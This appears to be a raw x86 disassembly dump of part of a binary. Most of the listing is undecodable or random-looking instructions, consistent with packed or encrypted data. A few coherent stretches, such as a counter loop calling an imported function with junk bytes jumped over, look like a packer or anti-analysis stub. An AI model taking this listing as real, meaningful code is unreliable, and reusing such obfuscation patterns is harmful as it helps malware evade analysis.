  405149:	sub    al,0xda
  40514b:	scas   eax,DWORD PTR es:[edi]
  40514c:	push   0xfffffff2
  40514e:	jae    0x4050e6
  405150:	pop    esi
  405151:	xor    al,0x26
  405153:	or     ebx,DWORD PTR [ebx-0x36a1a78]
  405159:	inc    esp
  40515a:	popf   
  40515b:	inc    esp
  40515c:	fisttp QWORD PTR [esi]
  40515e:	adc    al,0x92
  405160:	popa   
  405161:	(bad)  
  405162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405163:	aaa    
  405164:	loope  0x405181
  405166:	bnd jb 0x4051c8
  405169:	jns    0x405116
  40516b:	inc    eax
  40516c:	cmp    bl,BYTE PTR cs:[edi-0x1dfc0496]
  405173:	mov    al,ds:0xf416ea1c
  405178:	bound  edi,QWORD PTR [esp+ebp*4+0x1c8e3b0c]
  40517f:	cmp    al,0xf3
  405181:	das    
  405182:	out    0xb,eax
  405184:	pop    es
  405185:	or     esi,DWORD PTR [ecx+0x505d9cfc]
  40518b:	(bad)  
  40518c:	in     eax,0xed
  40518e:	jo     0x4051db
  405190:	push   ss
  405191:	xor    ecx,ecx
  405193:	repnz fs mov ebp,0xfe8cd063
  40519a:	test   eax,0x206021ae
  40519f:	push   ecx
  4051a0:	(bad)  
  4051a1:	xor    bl,dl
  4051a3:	imul   edx,DWORD PTR [esi+0x56],0x7a
  4051a7:	push   ebp
  4051a8:	sub    DWORD PTR [edi+edi*4],esp
  4051ab:	ja     0x405205
  4051ad:	mov    esi,0x94eeae40
  4051b2:	dec    esi
  4051b3:	push   edi
  4051b4:	mov    BYTE PTR [ebx],cl
  4051b6:	std    
  4051b7:	mov    edi,0x7cc14223
  4051bc:	arpl   WORD PTR [ebp+0x655ef0cc],sp
  4051c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c3:	lea    ebx,[edi]
  4051c5:	pop    edi
  4051c6:	shr    DWORD PTR [ecx+0x63],cl
  4051c9:	(bad)
  4051cc:	popa   
  4051cd:	push   ecx
  4051ce:	out    dx,eax
  4051cf:	cmp    cl,BYTE PTR [edi-0xe]
  4051d2:	or     al,0x1d
  4051d4:	dec    ebx
  4051d5:	push   ds
  4051d6:	jae    0x4051fe
  4051d8:	adc    DWORD PTR [esi-0x50],ecx
  4051db:	jbe    0x4051c0
  4051dd:	loope  0x405192
  4051df:	mov    ch,0x37
  4051e1:	fmul   DWORD PTR [edx]
  4051e3:	aam    0xe8
  4051e5:	dec    ebx
  4051e6:	scas   eax,DWORD PTR es:[edi]
  4051e7:	iret   
  4051e8:	cmp    eax,0xbeab9f70
  4051ed:	fst    st(2)
  4051ef:	xchg   edi,eax
  4051f0:	repnz push edi
  4051f2:	and    eax,0x95cc5546
  4051f7:	call   DWORD PTR [ebx]
  4051f9:	xchg   ebx,eax
  4051fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051fb:	and    BYTE PTR [ebp-0x492b3847],0x6a
  405202:	daa    
  405203:	xchg   edi,eax
  405204:	lea    eax,[eax+edx*1+0x32729a]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	int    0x15
  40523d:	dec    ecx
  40523e:	jg     0x405210
  405240:	sub    bh,BYTE PTR [esp+edi*2-0x4b]
  405244:	jns    0x4052c2
  405246:	jl     0x4052c7
  405248:	mov    ds:0xecfeee34,eax
  40524d:	fnstenv [edx]
  40524f:	mov    dl,0x3e
  405251:	je     0x4052a9
  405253:	rcr    DWORD PTR [ebx],cl
  405255:	mov    eax,0x1a6bc209
  40525a:	xchg   BYTE PTR [ebp+0x78],bl
  40525d:	mov    ah,0xe2
  40525f:	mov    BYTE PTR [ecx-0x78225bf1],bh
  405265:	pop    edx
  405266:	mov    bh,0x33
  405268:	push   ebx
  405269:	and    BYTE PTR [ebp+0x6f],ch
  40526c:	sbb    al,BYTE PTR [esi-0x54654267]
  405272:	cmp    bl,BYTE PTR [edi-0x77]
  405275:	mov    DWORD PTR [edx+ebp*1-0x35],edi
  405279:	div    DWORD PTR ds:0xc383155e
  40527f:	lods   al,BYTE PTR ds:[esi]
  405280:	xor    BYTE PTR [esi+0x10],dl
  405283:	mov    ch,0x7d
  405285:	mov    eax,0xee085228
  40528a:	sbb    dl,BYTE PTR [ebx-0x73613fc6]
  405290:	pop    ebp
  405291:	xchg   edi,eax
  405292:	(bad)  
  405294:	and    DWORD PTR [ebx+0x71047be9],ebp
  40529a:	inc    edx
  40529b:	aam    0xd6
  40529d:	std    
  40529e:	xchg   esi,eax
  40529f:	enter  0xc8e1,0xec
  4052a3:	sbb    DWORD PTR [ecx],ecx
  4052a5:	not    BYTE PTR [esi]
  4052a7:	lea    ebx,[ebp+0x6b]
  4052aa:	jne    0x405291
  4052ac:	bound  edi,QWORD PTR [ecx-0x7]
  4052af:	xchg   ebx,eax
  4052b0:	xor    BYTE PTR [edi+0x3e],cl
  4052b3:	out    dx,al
  4052b4:	mov    bh,BYTE PTR [ebx+eiz*4-0x17c480ed]
  4052bb:	shr    BYTE PTR [ebx+0x14884cb3],1
  4052c1:	sub    dh,dl
  4052c3:	retf   0xa318
  4052c6:	ins    BYTE PTR es:[edi],dx
  4052c7:	ins    BYTE PTR es:[edi],dx
  4052c8:	mov    ch,0x99
  4052ca:	push   edi
  4052cb:	hlt    
  4052cc:	sub    ch,BYTE PTR [ecx-0xc771fe]
  4052d2:	push   eax
  4052d3:	and    eax,0x636b51d7
  4052d8:	lods   eax,DWORD PTR ds:[esi]
  4052d9:	inc    ebx
  4052da:	sbb    al,BYTE PTR [esi+ebp*2-0x664eed95]
  4052e1:	xor    ch,BYTE PTR [edi]
  4052e3:	(bad)  
  4052e4:	jge    0x405288
  4052e6:	mov    cl,0x5e
  4052e8:	sub    eax,0x7b49ab0d
  4052ed:	sub    eax,0x73684b71
  4052f2:	pop    esi
  4052f3:	and    ecx,DWORD PTR [ebx+0x19]
  4052f6:	loop   0x4052a8
  4052f8:	rcr    BYTE PTR cs:[eax],1
  4052fb:	(bad)  
  4052fc:	jge    0x405320
  4052fe:	pop    ecx
  4052ff:	jne    0x4052e8
  405301:	ja     0x405327
  405303:	test   al,0xf9
  405305:	adc    bh,BYTE PTR [ebx+0x26]
  405308:	test   eax,0x456b5b7e
  40530d:	ins    BYTE PTR es:[edi],dx
  40530e:	mov    DWORD PTR [esi+0x5c9b351c],ebp
  405314:	push   edi
  405315:	dec    ebp
  405316:	or     ecx,DWORD PTR [ebp+edx*2+0x7a]
  40531a:	mov    eax,0x20458e74
  40531f:	inc    ebp
  405320:	outs   dx,BYTE PTR ds:[esi]
  405321:	scas   eax,DWORD PTR es:[edi]
  405322:	nop
  405323:	xchg   ebp,eax
  405324:	pop    ecx
  405325:	sbb    al,0xe
  405327:	rcl    BYTE PTR [esi],1
  405329:	mov    cl,0x4e
  40532b:	paddusw mm5,mm0
  40532e:	mov    al,dh
  405330:	std    
  405331:	dec    edx
  405332:	addr16 mov eax,ds:0x626
  405336:	xchg   ah,ah
  405338:	ret    
  405339:	enter  0x9247,0x7
  40533d:	push   0x27371e6b
  405342:	mov    ch,0xdb
  405344:	mov    ecx,0x5d43e186
  405349:	fs je  0x405319
  40534c:	mov    edi,0x2c71ced2
  405351:	dec    eax
  405352:	pop    eax
  405353:	test   BYTE PTR [ecx],ah
  405355:	hlt    
  405356:	mov    ds:0x1c0c5c68,al
  40535b:	out    dx,al
  40535c:	mov    esp,0xb35f3907
  405361:	mov    ebx,0x3d40c137
  405366:	js     0x405376
  405368:	or     BYTE PTR [esi-0x4d],cl
  40536b:	and    BYTE PTR [ebp-0x52],0xe
  40536f:	sbb    dl,BYTE PTR [edx-0x1e]
  405372:	push   edx
  405373:	adc    eax,0xb6b05096
  405378:	dec    ebp
  405379:	iret   
  40537a:	add    BYTE PTR [ebp-0x77],ah
  40537d:	push   esi
  40537e:	pop    ecx
  40537f:	ins    BYTE PTR es:[edi],dx
  405380:	enter  0xc453,0x1a
  405384:	icebp  
  405385:	dec    ebx
  405386:	enter  0x48ef,0x32
  40538a:	inc    esi
  40538b:	mov    dh,0x6e
  40538d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40538e:	push   ebx
  40538f:	adc    eax,0x38018138
  405394:	add    DWORD PTR [ecx-0x209b8213],edi
  40539a:	push   edi
  40539b:	sub    DWORD PTR [esi-0x5],esi
  40539e:	je     0x405326
  4053a0:	and    ebp,DWORD PTR [eax-0x4b]
  4053a3:	or     dh,ah
  4053a5:	sar    BYTE PTR [edx],cl
  4053a7:	ja     0x4053ec
  4053a9:	lea    eax,[esi]
  4053ab:	mov    dh,0xd2
  4053ad:	rol    DWORD PTR [eax],1
  4053af:	pop    ss
  4053b0:	dec    edi
  4053b1:	push   es
  4053b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053b3:	(bad)  
  4053b4:	call   0x1385cc8b
  4053b9:	ds addr16 jns 0x4053b1
  4053bd:	inc    ebp
  4053be:	lock (bad) 
  4053c0:	or     al,0xfa
  4053c2:	dec    edi
  4053c3:	pop    edi
  4053c4:	loop   0x405402
  4053c6:	add    BYTE PTR [edi+0x74878192],dl
  4053cc:	push   ds
  4053cd:	xor    eax,0x4ef8c95f
  4053d2:	sbb    eax,0x5b66de3b
  4053d7:	inc    edx
  4053d8:	mov    al,ds:0x54fbb17b
  4053dd:	mov    esi,DWORD PTR [eax+0x67]
  4053e0:	inc    BYTE PTR [edi-0x6]
  4053e3:	mov    al,ds:0x5b8d6d8d
  4053e8:	pop    esi
  4053e9:	inc    edx
  4053ea:	sbb    esp,DWORD PTR [ebp+0x71e79bf8]
  4053f0:	xor    DWORD PTR [esi+0x3a],esi
  4053f3:	ds jo  0x4053d3
  4053f6:	arpl   WORD PTR [eax+edi*2],sp
  4053f9:	sub    ecx,DWORD PTR [ebx+esi*8]
  4053fc:	xchg   DWORD PTR [esi+ebp*4],ebx
  4053ff:	sub    eax,0xc718cc9d
  405404:	adc    al,0xf9
  405406:	sbb    al,0xa0
  405408:	sti    
  405409:	dec    edx
  40540a:	in     al,0x7c
  40540c:	add    eax,0xd1a7c11e
  405411:	stos   DWORD PTR es:[edi],eax
  405412:	or     eax,0x1f3b59d
  405417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405418:	inc    esp
  405419:	sbb    DWORD PTR [esp+edi*1-0x5a],esp
  40541d:	jle    0x4053d2
  40541f:	pop    ecx
  405420:	adc    eax,0xae3fbb40
  405425:	or     esi,DWORD PTR [ecx+0x14c6ff52]
  40542b:	out    dx,eax
  40542c:	push   edx
  40542d:	sti    
  40542e:	push   esp
  40542f:	inc    edi
  405430:	jmp    0x8ee0aeff
  405435:	push   ebp
  405436:	add    edi,DWORD PTR [ecx-0x5255137f]
  40543c:	adc    BYTE PTR [eax+0x521c11ef],al
  405442:	mov    edx,0x9e3b729d
  405447:	xchg   ebx,eax
  405448:	fiadd  WORD PTR [edx+0x5f19f63c]
  40544e:	mov    al,ds:0xfa9a661a
  405453:	iret   
  405454:	xor    cl,BYTE PTR [ecx]
  405456:	pop    ds
  405457:	ficom  DWORD PTR [eax+0x380fe805]
  40545d:	xor    ah,BYTE PTR [edx+0x1e]
  405460:	test   eax,0xe3d71cfc
  405465:	dec    ecx
  405466:	not    BYTE PTR [ebx-0x4d13d5da]
  40546c:	push   ds
  40546d:	pop    edx
  40546e:	mov    ss,WORD PTR [eax]
  405470:	iret   
  405471:	push   ds
  405472:	and    edx,DWORD PTR [edx-0x3e7b6bef]
  405478:	xchg   edx,eax
  405479:	dec    ecx
  40547a:	mov    edi,0x3dab5466
  40547f:	ins    BYTE PTR es:[edi],dx
  405480:	jmp    0x405444
  405482:	sbb    BYTE PTR [edi+0x54e5b624],cl
  405488:	push   ss
  405489:	inc    ebp
  40548a:	jp     0x4054fe
  40548c:	inc    esp
  40548d:	(bad)  
  40548f:	cli    
  405490:	repz pop ebp
  405492:	repz cmc 
  405494:	clc    
  405495:	fbld   TBYTE PTR ds:0x7494af58
  40549b:	or     eax,0x6cddc0ef
  4054a0:	in     eax,dx
  4054a1:	clc    
  4054a2:	add    DWORD PTR [ecx+0xc],edi
  4054a5:	cmp    al,0x7a
  4054a7:	adc    al,0xae
  4054a9:	dec    edx
  4054aa:	dec    edi
  4054ab:	leave  
  4054ac:	das    
  4054ad:	mov    cl,0x2d
  4054af:	pusha  
  4054b0:	call   FWORD PTR [edx-0x4b57e7d8]
  4054b6:	std    
  4054b7:	inc    edi
  4054b8:	inc    esi
  4054b9:	adc    ecx,0xc555ece4
  4054bf:	lahf   
  4054c0:	jp     0x405529
  4054c2:	(bad)  
  4054c3:	fist   WORD PTR [ebx-0x439da7b4]
  4054c9:	test   ebp,ebx
  4054cb:	mov    al,ds:0x6f632d03
  4054d0:	idiv   BYTE PTR [esi]
  4054d2:	inc    edi
  4054d3:	mov    WORD PTR [edx],es
  4054d5:	sbb    eax,0x6b816869
  4054da:	sbb    ecx,DWORD PTR [eax*4+0x4bbe761d]
  4054e1:	mov    bh,0xa5
  4054e3:	mov    esi,0x28d6155f
  4054e8:	jbe    0x405556
  4054ea:	arpl   WORD PTR [ebx+0x27],di
  4054ed:	test   BYTE PTR [ebx-0x34],ah
  4054f0:	pop    esp
  4054f1:	in     eax,0xc4
  4054f3:	sbb    bh,BYTE PTR [eax-0x7f64fa78]
  4054f9:	(bad)  
  4054fa:	mov    ds:0xdbe2e42e,al
  4054ff:	imul   edx
  405501:	sbb    eax,0x7aa8aed2
  405506:	and    ebp,DWORD PTR [edi-0x37908e31]
  40550c:	arpl   WORD PTR [esi+0x5a],bx
  40550f:	jo     0x40554c
  405511:	das    
  405512:	popf   
  405513:	xchg   ch,bl
  405515:	out    0xf5,eax
  405517:	out    dx,eax
  405518:	sbb    DWORD PTR [esi+ecx*8-0x36a0db9e],edx
  40551f:	arpl   si,si
  405521:	ror    DWORD PTR ds:0x612505c4,1
  405527:	mov    WORD PTR ds:0x14fa,ss
  40552c:	jmp    0xc996:0xba457288
  405533:	das    
  405534:	out    dx,eax
  405535:	test   edx,ebp
  405537:	ficom  DWORD PTR [edi+esi*1+0x6d67ba18]
  40553e:	or     ch,BYTE PTR [ebp+0x19e05c69]
  405544:	push   ecx
  405545:	fyl2xp1 
  405547:	sub    dl,BYTE PTR [eax+0x4a68d13c]
  40554d:	adc    dh,BYTE PTR [esi-0x4]
  405550:	push   esi
  405551:	(bad)  
  405553:	xchg   esi,eax
  405554:	cs cli 
  405556:	dec    ecx
  405557:	pop    ss
  405558:	test   DWORD PTR [ebp-0x52],esp
  40555b:	inc    eax
  40555c:	jb     0x40556c
  40555e:	and    eax,DWORD PTR [ebx+0x70]
  405561:	arpl   WORD PTR [ecx+0x72],di
  405564:	mov    ecx,0x57046e31
  405569:	icebp  
  40556a:	es gs sti 
  40556d:	fiadd  DWORD PTR [ecx-0x71]
  405570:	mov    ecx,esp
  405572:	mov    eax,0x2b04dc60
  405577:	clc    
  405578:	and    esi,esi
  40557a:	arpl   sp,dx
  40557c:	in     al,dx
  40557d:	cwde   
  40557e:	push   0x22
  405580:	push   ss
  405581:	outs   dx,BYTE PTR ds:[esi]
  405582:	and    BYTE PTR [edi+ebx*4+0x3b252598],dh
  405589:	push   esp
  40558a:	scas   eax,DWORD PTR es:[edi]
  40558b:	daa    
  40558c:	std    
  40558d:	xor    BYTE PTR [ebx+0xa],bh
  405590:	push   esp
  405591:	xor    ah,BYTE PTR [edx+0xda655e6]
  405597:	push   cs
  405598:	shl    BYTE PTR [edx-0x54cf227e],0x6a
  40559f:	test   BYTE PTR [eax-0x404eaa8a],bl
  4055a5:	mov    bh,ah
  4055a7:	dec    ebx
  4055a8:	push   ss
  4055a9:	mov    bh,0xc2
  4055ab:	cmp    BYTE PTR [edx+0x58988f7a],dh
  4055b1:	and    ecx,edx
  4055b3:	push   esi
  4055b4:	jecxz  0x40553c
  4055b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055b7:	addr16 adc dl,al
  4055ba:	fiadd  WORD PTR [ebx]
  4055bc:	push   0x3b903ea2
  4055c1:	fcom   DWORD PTR ds:0x8f024fab
  4055c7:	xchg   ebx,eax
  4055c8:	sub    eax,DWORD PTR ds:0xfa7d9f52
  4055ce:	bound  ecx,QWORD PTR [edx+0x6c6d007f]
  4055d4:	and    BYTE PTR [edi+ecx*2],al
  4055d7:	lea    esi,[ecx-0x1a0d6228]
  4055dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055de:	xchg   esp,eax
  4055df:	mov    al,ds:0x52bf024d
  4055e4:	xchg   al,cl
  4055e6:	(bad)  
  4055e7:	std    
  4055e8:	popf   
  4055e9:	in     eax,0x56
  4055eb:	aad    0x1d
  4055ed:	fistp  QWORD PTR [ebp-0x3b]
  4055f0:	jns    0x405619
  4055f2:	mov    ch,0x6
  4055f4:	mov    BYTE PTR ds:0x4d539520,ah
  4055fa:	fwait
  4055fb:	cmp    ah,0x1f
  4055fe:	push   ecx
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x433563,0x0
  40560a:	mov    eax,ds:0x433563
  40560f:	inc    eax
  405610:	mov    ds:0x433563,eax
  405615:	cmp    DWORD PTR ds:0x433563,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433563,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433563
  405642:	inc    eax
  405643:	mov    ds:0x433563,eax
  405648:	cmp    DWORD PTR ds:0x433563,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	arpl   WORD PTR [eax+ecx*8+0x7c36098b],ax
  405676:	jl     0x40562d
  405678:	jns    0x4056f6
  40567a:	jl     0x4056bc
  40567c:	sub    eax,DWORD PTR [edx-0x2ef4bc60]
  405682:	xor    BYTE PTR [ecx+0x6b34fd12],cl
  405688:	inc    edx
  405689:	jbe    0x40565f
  40568b:	ficom  WORD PTR [ebp-0x7536ff7d]
  405691:	cmp    DWORD PTR ds:0x61a4cc1d,esi
  405697:	loope  0x40561d
  405699:	jle    0x405621
  40569b:	call   0x88d5:0x60d50fd1
  4056a2:	push   eax
  4056a3:	aas    
  4056a4:	jle    0x405667
  4056a6:	ins    BYTE PTR es:[edi],dx
  4056a7:	sub    eax,0xf4efa520
  4056ac:	xchg   ebp,eax
  4056ad:	jge    0x405638
  4056af:	jnp    0x40572c
  4056b1:	or     cl,BYTE PTR [eax-0x7b0810c1]
  4056b7:	in     al,dx
  4056b8:	mov    ch,0xee
  4056ba:	ret    0x9e20
  4056bd:	jmp    0x3ac9:0xb5896b7d
  4056c4:	or     eax,DWORD PTR [ebx+0x6e]
  4056c7:	jb     0x405689
  4056c9:	add    DWORD PTR [esi+0x34],ebx
  4056cc:	int    0xa1
  4056ce:	rcl    DWORD PTR [ecx+0x64],1
  4056d1:	jle    0x405688
  4056d3:	rcl    DWORD PTR [bx+di],cl
  4056d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d7:	std    
  4056d8:	shl    DWORD PTR [ebx],cl
  4056da:	add    BYTE PTR [ebp-0x16],0x96
  4056de:	test   eax,0xfe3ff356
  4056e3:	or     esp,DWORD PTR [ebx]
  4056e5:	sbb    dh,ah
  4056e7:	iret   
  4056e8:	jle    0x4056ce
  4056ea:	(bad)  
  4056eb:	dec    ecx
  4056ec:	pushf  
  4056ed:	scas   eax,DWORD PTR es:[edi]
  4056ee:	clc    
  4056ef:	fcom   QWORD PTR [ebx+eax*8-0x8cdaf01]
  4056f6:	or     ah,BYTE PTR [edx+edi*1]
  4056f9:	cmp    BYTE PTR [ebx-0x28],ch
  4056fc:	or     bh,BYTE PTR [ebx-0x29160b85]
  405702:	pop    ss
  405703:	or     BYTE PTR [edx+0x32],dl
  405706:	jle    0x405752
  405708:	jno    0x405753
  40570a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40570b:	pushf  
  40570c:	mov    eax,ds:0x31cf3bf0
  405711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405712:	(bad)  
  405713:	pop    edi
  405714:	dec    ebx
  405715:	inc    ebp
  405716:	icebp  
  405717:	rol    edx,cl
  405719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40571a:	(bad)  
  40571b:	dec    esi
  40571c:	jne    0x4056f9
  40571e:	fdivr  DWORD PTR [edx+ebx*2]
  405721:	sbb    BYTE PTR [eax],al
  405723:	out    dx,eax
  405724:	jmp    0x4056fe
  405726:	xchg   ebp,eax
  405727:	mul    DWORD PTR [ebp+0x28178c8]
  40572d:	in     eax,0x3a
  40572f:	sti    
  405730:	pusha  
  405731:	and    eax,0x92a07f32
  405736:	sub    al,0xa5
  405738:	push   0x6d
  40573a:	pop    ebx
  40573b:	xor    dl,BYTE PTR [edx]
  40573d:	jp     0x4056ed
  40573f:	popa   
  405740:	push   0x62
  405742:	out    0x8d,eax
  405744:	dec    ebx
  405745:	and    esp,DWORD PTR [ebx-0x53]
  405748:	lea    ebp,[edi]
  40574a:	xchg   edx,eax
  40574b:	pop    ebx
  40574c:	(bad)  
  40574d:	lock jnp 0x40577e
  405750:	ficom  WORD PTR [edx-0x7354ebf5]
  405756:	pushf  
  405757:	pop    es
  405758:	pop    edi
  405759:	pop    esi
  40575a:	and    eax,0x49043ecb
  40575f:	rcl    DWORD PTR [esi],0x76
  405762:	add    cl,cl
  405764:	lock popa 
  405766:	(bad)  
  405767:	aas    
  405768:	daa    
  405769:	es call 0x9f5e:0xc0d8dc37
  405771:	rol    WORD PTR [ebx+ebp*1],1
  405775:	xor    ecx,DWORD PTR [ebp+0x5f]
  405778:	dec    ebp
  405779:	test   BYTE PTR [eax],cl
  40577b:	push   DWORD PTR [eax-0x3b]
  40577e:	jne    0x405789
  405780:	and    eax,eax
  405782:	jbe    0x405707
  405784:	mov    DWORD PTR [ebx+0x4f],eax
  405787:	pop    es
  405788:	rcl    DWORD PTR [ebx],cl
  40578a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40578b:	pop    edi
  40578c:	ins    DWORD PTR es:[edi],dx
  40578d:	xlat   BYTE PTR ds:[ebx]
  40578e:	nop
  40578f:	cmp    eax,0x1219242c
  405794:	neg    DWORD PTR [eax]
  405796:	fmulp  st(6),st
  405798:	jg     0x405750
  40579a:	and    eax,ebx
  40579c:	xor    BYTE PTR [edi-0x40206af4],bl
  4057a2:	and    DWORD PTR [ebx+0x53],0x6f0cb6bc
  4057a9:	pop    edx
  4057aa:	mov    al,ds:0x692c3317
  4057af:	xlat   BYTE PTR ds:[ebx]
  4057b0:	inc    ebp
  4057b1:	loope  0x405734
  4057b3:	retf   0xbd27
  4057b6:	adc    BYTE PTR [esi-0x7c],dl
  4057b9:	mov    cl,0xe1
  4057bb:	arpl   WORD PTR [ebp+0x4ad09a24],dx
  4057c1:	or     bl,bh
  4057c3:	adc    eax,DWORD PTR [ebx]
  4057c5:	outs   dx,DWORD PTR ds:[esi]
  4057c6:	repz jo 0x4057af
  4057c9:	push   ebx
  4057ca:	sbb    al,0x75
  4057cc:	inc    edi
  4057cd:	pop    ecx
  4057ce:	mov    al,0x16
  4057d0:	nop
  4057d1:	scas   al,BYTE PTR es:[edi]
  4057d2:	mov    al,0x38
  4057d4:	inc    ebp
  4057d5:	rol    BYTE PTR [edi+0x22f504c1],1
  4057db:	rol    BYTE PTR [edi+0x7e3c69a2],1
  4057e1:	test   BYTE PTR [ecx-0x5f],dl
  4057e4:	jmp    0x40584b
  4057e6:	out    dx,eax
  4057e7:	cmp    dl,BYTE PTR [edi+0x74279baa]
  4057ed:	adc    esp,DWORD PTR [eax-0x59f02478]
  4057f3:	je     0x40586f
  4057f5:	sbb    BYTE PTR [ebx+edi*8+0x0],bl
  4057f9:	pop    edx
  4057fa:	shl    BYTE PTR [esi+ebx*2+0x1f],cl
  4057fe:	cmp    DWORD PTR [esi],eax
  405800:	jmp    0xe4b4:0xd7421986
  405807:	inc    ecx
  405808:	mov    al,ds:0xe94f6b5
  40580d:	and    ebx,DWORD PTR [ecx+edi*8+0x70]
  405811:	arpl   WORD PTR [ebx+0x42],ax
  405814:	popf   
  405815:	cmp    eax,0x9a7bc41b
  40581a:	ss pop ds
  40581c:	mov    cl,0x93
  40581e:	data16 cmc 
  405820:	neg    DWORD PTR [ebx+0x67f3034c]
  405826:	stos   BYTE PTR es:[edi],al
  405827:	sub    al,0xf
  405829:	mov    fs,WORD PTR [ebx-0x4d]
  40582c:	addr16 dec eax
  40582e:	jo     0x4057ce
  405830:	adc    al,0xa5
  405832:	jmp    0x40580b
  405834:	mov    es:0x96144c54,al
  40583a:	neg    BYTE PTR [edi-0x36]
  40583d:	adc    eax,DWORD PTR [ebx+ebx*2]
  405840:	cmp    cl,BYTE PTR [esp+edi*8-0x10dc65b]
  405847:	(bad)  
  405848:	(bad)  
  405849:	jmp    0x40580c
  40584b:	retf   0x7c4f
  40584e:	pop    ss
  40584f:	mov    ecx,0x2d91a3ab
  405854:	sub    DWORD PTR [ecx+0x2e],0xffffffb0
  405858:	jbe    0x40583a
  40585a:	sub    al,0x2e
  40585c:	es sub bh,cl
  40585f:	fldenv ss:[ebp+0x5d97d83]
  405866:	cmp    dh,0x3
  405869:	xchg   BYTE PTR [ebx+0x46],dh
  40586c:	frstor [esi+0x49]
  40586f:	push   edi
  405870:	push   ebx
  405871:	data16 xlat BYTE PTR ds:[ebx]
  405873:	dec    ebp
  405874:	mov    cs,ebx
  405876:	into   
  405877:	mov    esp,0x8c14c711
  40587c:	cdq    
  40587d:	dec    esi
  40587e:	jle    0x4058cf
  405880:	fistp  WORD PTR [ebp-0x37]
  405883:	jae    0x405805
  405885:	imul   esp,DWORD PTR [edi+0x66],0xffffff9d
  405889:	push   edx
  40588a:	ficom  DWORD PTR [ebx]
  40588c:	xchg   esp,eax
  40588d:	repz imul ecx,DWORD PTR [esi-0x703866a5],0x8e392a70
  405898:	test   eax,0x78505e38
  40589d:	dec    ecx
  40589e:	retf   0x4861
  4058a1:	test   eax,0xa4a9fee9
  4058a6:	scas   al,BYTE PTR es:[edi]
  4058a7:	call   0xe0a:0x6f585f1f
  4058ae:	lods   al,BYTE PTR ds:[esi]
  4058af:	cdq    
  4058b0:	test   edi,edi
  4058b2:	jns    0x405888
  4058b4:	xor    BYTE PTR [eax],bl
  4058b6:	pop    ss
  4058b7:	(bad)  
  4058b8:	jbe    0x405905
  4058ba:	cmp    eax,esi
  4058bc:	jecxz  0x4058b7
  4058be:	add    al,0x63
  4058c0:	aad    0x90
  4058c2:	add    BYTE PTR [eax-0x244b6ee7],al
  4058c8:	mov    dh,0xe8
  4058ca:	pop    ds
  4058cb:	(bad)  
  4058cc:	adc    ch,al
  4058ce:	or     al,0x6e
  4058d0:	xchg   edi,eax
  4058d1:	(bad)  
  4058d2:	int3   
  4058d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d4:	shr    BYTE PTR [ebx+0x316d7cdd],cl
  4058da:	mov    ch,0x41
  4058dc:	mov    dl,0x59
  4058de:	jnp    0x4058f4
  4058e0:	add    cl,BYTE PTR [esi]
  4058e2:	adc    DWORD PTR [esi+ecx*1],ebx
  4058e5:	popa   
  4058e6:	stos   BYTE PTR es:[edi],al
  4058e7:	pop    ss
  4058e8:	aas    
  4058e9:	cld    
  4058ea:	retf   
  4058eb:	inc    esi
  4058ec:	sahf   
  4058ed:	add    bh,BYTE PTR [ebp+0x6e]
  4058f0:	fmulp  st(6),st
  4058f2:	pop    edx
  4058f3:	lahf   
  4058f4:	gs mov eax,0x3c4328e3
  4058fa:	addr16 mov edx,gs
  4058fd:	mov    bh,0x1c
  4058ff:	cmc    
  405900:	push   cs
  405901:	adc    DWORD PTR [edi],eax
  405903:	mov    ebp,0xb4f6c17f
  405908:	jne    0x4058c2
  40590a:	sbb    ecx,DWORD PTR [eax]
  40590c:	stos   BYTE PTR es:[edi],al
  40590d:	jl     0x405989
  40590f:	aad    0xf8
  405911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405912:	pop    esp
  405913:	fs pop es
  405915:	aaa    
  405916:	sub    edx,DWORD PTR [ebx-0x6a2f129d]
  40591c:	rcr    BYTE PTR [esi-0x4f],0xdc
  405920:	and    bh,dl
  405922:	dec    ebx
  405923:	(bad)  
  405924:	ror    BYTE PTR [eax],1
  405926:	outs   dx,BYTE PTR ds:[esi]
  405927:	xchg   edx,eax
  405928:	dec    eax
  405929:	cmp    dl,BYTE PTR [eax+0x7baf9c93]
  40592f:	cmc    
  405930:	cmp    ecx,DWORD PTR [ebx]
  405932:	xor    eax,0xf08b0ac5
  405937:	push   0xcd54a53d
  40593c:	vpand  xmm4,xmm1,XMMWORD PTR [ebp-0x66]
  405941:	sbb    al,0xaf
